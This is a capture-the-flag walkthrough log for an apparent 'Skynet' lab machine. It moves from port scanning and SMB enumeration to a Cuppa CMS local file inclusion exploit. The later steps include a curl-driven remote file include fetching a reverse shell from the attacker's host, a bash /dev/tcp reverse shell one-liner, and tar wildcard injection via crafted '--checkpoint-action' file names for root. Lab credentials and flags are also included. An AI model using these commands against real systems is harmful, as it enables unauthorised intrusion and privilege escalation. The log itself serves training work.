# nmap -sV O 10.10.59.113 

22/tcp    open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp    filtered domain
80/tcp    open     http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp   open     pop3        Dovecot pop3d
139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp   open     imap        Dovecot imapd
445/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
10778/tcp filtered unknown
Aggressive OS guesses: ASUS RT-N56U WAP (Linux 3.4) (94%), Linux 3.16 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.2 - 3.16 (92%), Linux 3.2 - 4.9 (92%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.10 - 3.13 (92%), Linux 3.13 (91%), Linux 2.4.26 (Slackware 10.0.0) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.24 seconds



# enum4linux -a 10.10.59.113 ,-a

 ========================================= 
|    Share Enumeration on 10.10.59.113    |
 ========================================= 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      Skynet Anonymous Share
	milesdyson      Disk      Miles Dyson Personal Share
	IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            SKYNET

[+] Attempting to map shares on 10.10.59.113
//10.10.59.113/print$	Mapping: DENIED, Listing: N/A
//10.10.59.113/anonymous	Mapping: OK, Listing: OK
//10.10.59.113/milesdyson	Mapping: DENIED, Listing: N/A
//10.10.59.113/IPC$	[E] Can't understand response:
session setup failed: NT_STATUS_IO_TIMEOUT


# smbclient //10.10.59.113/anonymous -N
# dir
  .                                   D        0  Thu Nov 26 18:04:00 2020
  ..                                  D        0  Tue Sep 17 09:20:17 2019
  attention.txt                       N      163  Wed Sep 18 05:04:59 2019
  logs  
                              D        0  Wed Sep 18 06:42:16 2019
# get attention.txt
#cat attention.txt 
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
# get log1.txt,log2.txt,log3.txt
# cat log1.txt
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator

# dirbuster 
http://10.10.4.124/squirrelmail/

# login to squirrelmail, milesdyson:cyborg007haloterminator 
  in an email: samba password: )s{A&2Z=F^n_E.B`


# smbclient -U milesdyson //10.10.169.227//milesdyson 

# get important.txt
# cat important.txt
  1. Add features to beta CMS /45kra24zxs28v3yd
  2. Work on T-800 Model 101 blueprints
  3. Spend more time with my wife
  
  
# dirbuster on http://10.10.4.124/45kra24zxs28v3yd
  /administrator:
   cuppa cms, vulnerable to LFI
    exploit:
       http://10.10.187.203/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../home/milesdyson/user.txt
  user flag: 7ce5c2109a40f958099283600a9ae807
  
# LFI to RCE:
   curl http://10.10.124.212/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.2.92.176:8000/revshell.php
  
  
# cat /etc/cron
    */1 *	* * *   root	/home/milesdyson/backups/backup.sh
	
# cat /home/milesdyson/backups/backup.sh
   #!/bin/bash
   cd /var/www/html
   tar cf /home/milesdyson/backups/backup.tgz *
#cd /var/www/html
#echo '#!/bin/bash' > shell.sh
#echo 'bash -i >& /dev/tcp/10.2.92.176/4444 0>&1' >> shell.sh
#chmod +x shell.sh
#touch /var/www/html/--checkpoint=1                       
#touch /var/www/html/--checkpoint-action=exec=bash\ shell.sh 
  
root flag: 3f0372db24753accc7179a282cd6a949
